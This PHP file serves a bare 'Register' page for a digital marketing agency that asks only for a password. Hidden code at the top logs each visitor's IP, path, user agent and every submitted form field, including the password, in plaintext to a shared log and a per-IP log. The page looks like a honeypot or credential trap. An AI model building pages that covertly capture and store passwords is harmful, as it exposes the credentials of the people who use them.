
<?php

$values = [
  'date' => date('Y-m-d H:i:s'),
  'ip' => $_SERVER['REMOTE_ADDR'],
  'path' => $_SERVER['REQUEST_URI'],
  'user-agent' => $_SERVER['HTTP_USER_AGENT'],
  'extra' => $_POST
];

$ip_name = $_SERVER['REMOTE_ADDR'];

if ($ip_name == "::1") {
  $ip_name = "localhost";
}

file_put_contents('visitors.log', json_encode($values) . PHP_EOL, FILE_APPEND);
file_put_contents(urlencode($ip_name) . '.log', json_encode($values) . PHP_EOL, FILE_APPEND);

?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Register - Digital Marketing Agency</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      background: #fff;
      padding: 2.5rem 2rem;
      border-radius: 15px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
      width: 100%;
      max-width: 420px;
    }

    .container h2 {
      text-align: center;
      margin-bottom: 1.5rem;
      color: #2a5298;
    }

    .container img {
        position: relative;
        left: 50%;
        transform: translateX(-50%);
        width: 100px;
        height: 100px;
        margin-bottom: 20px;
    }

    .form-group {
      margin-bottom: 1.2rem;
    }

    label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 600;
    }

    input, select {
      width: 100%;
      padding: 0.8rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 1rem;
    }

    input:focus, select:focus {
      border-color: #2a5298;
      outline: none;
      box-shadow: 0 0 5px rgba(42, 82, 152, 0.4);
    }

    .btn {
      width: 100%;
      padding: 0.9rem;
      border: none;
      background-color: #2a5298;
      color: white;
      font-size: 1rem;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 1rem;
      transition: background 0.3s;
    }

    .btn:hover {
      background-color: #1e3c72;
    }

    .footer {
      text-align: center;
      margin-top: 1.5rem;
      font-size: 0.9rem;
      color: #666;
    }

    .footer a {
      color: #2a5298;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAwR5qfll1low5flZPD5ejK6mWT_sWDKfefQ&s'/>
    <h2>Join Our Marketing Team</h2>
    <form action="#" method="POST">
      <div class="form-group">
        <label for="password">Confirmation</label>
        <input type="password" id="regcode" name="password" required />
      </div>
      <button type="submit" class="btn">Register</button>
    </form>
  </div>
</body>
</html>
